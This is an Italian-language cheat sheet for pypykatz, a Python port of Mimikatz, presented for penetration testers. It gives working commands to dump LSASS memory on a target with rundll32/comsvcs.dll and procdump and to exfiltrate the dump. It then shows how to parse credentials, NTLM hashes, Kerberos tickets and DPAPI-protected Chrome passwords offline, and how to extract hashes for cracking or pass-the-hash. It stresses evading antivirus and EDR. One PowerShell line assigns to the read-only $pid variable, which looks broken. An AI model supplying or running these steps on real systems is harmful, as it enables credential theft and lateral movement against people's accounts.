<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# pypykatz Cheatsheet

[pypykatz](https://github.com/skelsec/pypykatz) è una pura implementazione Python di [Mimikatz](https://github.com/gentilkiwi/mimikatz). Consente ai penetration tester e agli addetti alla risposta agli incidenti di analizzare dump della memoria LSASS di Windows, hive del registro SAM/SYSTEM/SECURITY, chiavi DPAPI e ticket Kerberos completamente offline su Linux e macOS senza attivare Windows Defender, agenti di rilevamento e risposta degli endpoint (EDR) o richiedere l'accesso host Windows in tempo reale.

---

## Sommario

- [Panoramica e sicurezza operativa (OpSec)](#panoramica--sicurezza-operativa-opsec)
- [Installazione](#installazione)
- [Analisi del dump LSASS offline (`lsa minidump`)](#offline-lsass-dump-parsing-lsa-minidump)
- [Estrazione Hive SAM e SYSTEM (`registry sam`)](#sam--system-hive-extraction-registry-sam)
- [Estrazione dei segreti LSA (`registry security`)](#lsa-secrets-extraction-registry-security)
- [Chiavi master DPAPI e analisi delle credenziali](#dpapi-master-keys--credential-parsing)
- [Esportazione JSON e pipeline di credenziali automatizzate](#json-export--automated-credential-pipelines)
- [Tecniche per eseguire il dump sicuro di LSASS su Windows](#techniques-to-safely-dump-lsass-on-windows)

---

## Panoramica e sicurezza operativa (OpSec)

L'esecuzione dello standard `mimikatz.exe` su un computer Windows di destinazione attiva spesso sensori comportamentali e firme statiche. `pypykatz` separa la fase di dumping dalla fase di parsing:
1. Scaricare la memoria del processo LSASS utilizzando strumenti nativi o LOLBAS (Task Manager, `procdump`, `rundll32.exe` o `comsvcs.dll`).
2. Esfiltra il file `.dmp` nel tuo sistema di analisi Linux.
3. Analizza le credenziali completamente offline con `pypykatz` con zero rischi AV.

---

## Installazione
```bash
# Recommended: Install via pipx
pipx install pypykatz

# Or via standard pip
python3 -m pip install --user pypykatz

# From source
git clone https://github.com/skelsec/pypykatz.git
cd pypykatz
pip install .

# Verify installation
pypykatz -h
```
---

## Analisi del dump LSASS offline (`lsa minidump`)

Analizza i dump della memoria generati da `lsass.exe` per recuperare password in chiaro, hash NTLM, hash SHA1, ticket Kerberos (TGT/TGS) e chiavi di crittografia AES:

### 1. Analisi minidump di base
```bash
pypykatz lsa minidump /path/to/lsass.dmp
```
L'output estrae le credenziali partizionate dai fornitori di sicurezza:
- **msv1_0:** Nomi utente, domini, hash NTLM e hash LM.
- **wdigest:** password in chiaro (se la memorizzazione nella cache di WDigest è abilitata).
- **kerberos:** sessioni ticket Kerberos e chiavi AES.
- **ssp:** credenziali del fornitore del supporto di sicurezza.
- **livessp:** credenziali dell'account Microsoft.
- **cloudap:** Azure AD token di aggiornamento primari (PRT) e chiavi di sessione.

### 2. Analizzare più dump della memoria in modo ricorsivo
```bash
pypykatz lsa minidump /loot/dumps/ -r
```
---

## Estrazione Hive SAM e SISTEMA (`registry sam`)

Estrai nomi utente di account locali, RID e hash delle password NTLM dalle copie hive del registro di Windows offline:
```bash
pypykatz registry sam /loot/SYSTEM /loot/SAM
```
Produzione:
```text
RID: 500
Username: Administrator
LM: None
NT: 31d6cfe0d16ae931b73c59d7e0c089c0
```
---

## Estrazione dei segreti LSA (`registry security`)

Recupera i segreti LSA, le password degli account del computer, le password di dominio predefinite e le chiavi in chiaro dell'account di servizio dagli hive `SECURITY` e `SYSTEM`:
```bash
pypykatz registry security /loot/SYSTEM /loot/SECURITY
```
I segreti estratti includono:
- `_SC_DefaultPassword`: credenziali di accesso automatico.
-`$MACHINE.ACC`: hash NTLM dell'account del computer di dominio.
- Credenziali di dominio memorizzate nella cache (DCC2 / mscache2).

---

## Chiavi master DPAPI e analisi delle credenziali

L'API Data Protection (DPAPI) crittografa le password di Chrome, le chiavi Wi-Fi e le credenziali RDP:

### 1. Estrarre le chiavi master DPAPI da Registro e SISTEMA
```bash
pypykatz dpapi masterkey /loot/SYSTEM /loot/masterkey_file
```
### 2. Decriptare le password memorizzate di Chrome
```bash
pypykatz dpapi chrome --masterkey <MASTER_KEY_HEX> /loot/Login_Data
```
---

## Esportazione JSON e pipeline di credenziali automatizzate

Esporta le credenziali analizzate direttamente in JSON per l'acquisizione immediata in Hashcat, BloodHound o CrackMapExec:
```bash
# Export minidump parsing to structured JSON
pypykatz lsa minidump lsass.dmp -k /tmp/loot_creds.json
```
Estrai hash NTLM puliti utilizzando `jq` per il cracking immediato dell'hash o il pass-the-hash:
```bash
jq -r '.logon_sessions[].msv_creds[] | "\(.username):\(.NT)"' /tmp/loot_creds.json | grep -v 'None' | sort -u > ntlm_hashes.txt
```
---

## Tecniche per eseguire il dump sicuro di LSASS su Windows

Per alimentare memoria in `pypykatz`, crea un minidump LSASS sull'host di destinazione utilizzando componenti nativi:

### 1. LOLBAS nativo tramite `comsvcs.dll` (PowerShell amministrativo)
```powershell
# Get LSASS process ID
$pid = (Get-Process lsass).Id

# Execute dump using native rundll32
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\lsass.dmp full
```
### 2. GUI di Gestione attività
1. Apri Task Manager come amministratore.
2. In **Dettagli**, fare clic con il pulsante destro del mouse su `lsass.exe`.
3. Fare clic su **Crea file dump** (salvato in `%TEMP%\lsass.DMP`).

### 3. Sysinternals `procdump`
```cmd
procdump.exe -ma -accepteula lsass.exe C:\Temp\lsass.dmp
```
*Una volta scaricato sul tuo computer Linux, esegui `pypykatz lsa minidump lsass.dmp`.*